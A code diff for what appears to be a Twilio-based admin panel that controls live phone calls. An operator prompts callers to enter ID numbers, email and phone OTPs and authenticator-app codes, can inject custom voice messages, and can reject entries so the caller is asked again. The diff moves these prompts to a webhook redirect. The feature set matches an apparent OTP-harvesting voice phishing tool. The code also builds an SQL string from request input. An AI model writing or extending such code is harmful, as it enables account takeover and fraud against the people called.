@@ -42,6 +42,7 @@ router.post('/request-action/:sessionId', async (req, res) => {
     }
     
     try {
+        // Get the call SID
         const session = await db.query(
             `SELECT call_sid, status FROM call_sessions WHERE id = $1`,
             [sessionId]
@@ -57,6 +58,7 @@ router.post('/request-action/:sessionId', async (req, res) => {
             });
         }
         
+        // Update the session action in database
         await db.query(
             `UPDATE call_sessions SET current_action = 'waiting_for_${action}' WHERE id = $1`,
             [sessionId]
@@ -67,10 +69,13 @@ router.post('/request-action/:sessionId', async (req, res) => {
             [sessionId, action]
         );
         
+        // CRITICAL FIX: Use redirect instead of direct TwiML update
+        // This forces the call to go to the webhook which will play the prompt
         if (callSid) {
-            const twiml = `<Response><Say>${actionConfig.message}</Say><Gather numDigits="${actionConfig.numDigits}" action="/webhooks/collect-${actionConfig.route}/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
+            const redirectUrl = `${req.protocol}://${req.get('host')}/webhooks/voice-response/${sessionId}`;
+            const twiml = `<Response><Redirect>${redirectUrl}</Redirect></Response>`;
             await client.calls(callSid).update({ twiml: twiml });
-            console.log(`Updated call ${callSid} with new TwiML for action: ${action}`);
+            console.log(`Redirected call ${callSid} to ${redirectUrl}`);
         }
         
         io.emit('admin_action', { session_id: sessionId, action: action, message: actionConfig.message });
@@ -122,10 +127,12 @@ router.post('/custom-voice/:sessionId', async (req, res) => {
             [sessionId, 'custom_voice', message]
         );
         
+        // Use redirect instead of direct TwiML update
         if (callSid) {
-            const twiml = `<Response><Say>${message}</Say><Gather numDigits="20" action="/webhooks/collect-custom/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
+            const redirectUrl = `${req.protocol}://${req.get('host')}/webhooks/voice-response/${sessionId}`;
+            const twiml = `<Response><Redirect>${redirectUrl}</Redirect></Response>`;
             await client.calls(callSid).update({ twiml: twiml });
-            console.log(`Updated call ${callSid} with custom voice: ${message}`);
+            console.log(`Redirected call ${callSid} for custom voice`);
         }
         
         io.emit('admin_action', { session_id: sessionId, action: 'custom_voice', message: message });
@@ -174,30 +181,10 @@ router.post('/reject-last-data/:sessionId', async (req, res) => {
             [`waiting_for_${lastDataType}`, sessionId]
         );
         
-        let route = '';
-        let message = '';
-        let numDigits = 20;
-        
-        if (lastDataType === 'id_number') {
-            route = 'id';
-            message = 'Please enter your ID number followed by the pound key.';
-            numDigits = 20;
-        } else if (lastDataType === 'email_otp') {
-            route = 'email-otp';
-            message = 'Please enter the 6 digit OTP from your email followed by the pound key.';
-            numDigits = 6;
-        } else if (lastDataType === 'auth_otp') {
-            route = 'auth-otp';
-            message = 'Please enter the 6 digit code from your authenticator app followed by the pound key.';
-            numDigits = 6;
-        } else if (lastDataType === 'phone_otp') {
-            route = 'phone-otp';
-            message = 'Please enter the 6 digit OTP sent to your phone followed by the pound key.';
-            numDigits = 6;
-        }
-        
+        // Use redirect
         if (callSid) {
-            const twiml = `<Response><Say>Invalid data. ${message}</Say><Gather numDigits="${numDigits}" action="/webhooks/collect-${route}/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
+            const redirectUrl = `${req.protocol}://${req.get('host')}/webhooks/voice-response/${sessionId}`;
+            const twiml = `<Response><Redirect>${redirectUrl}</Redirect></Response>`;
             await client.calls(callSid).update({ twiml: twiml });
         }
         
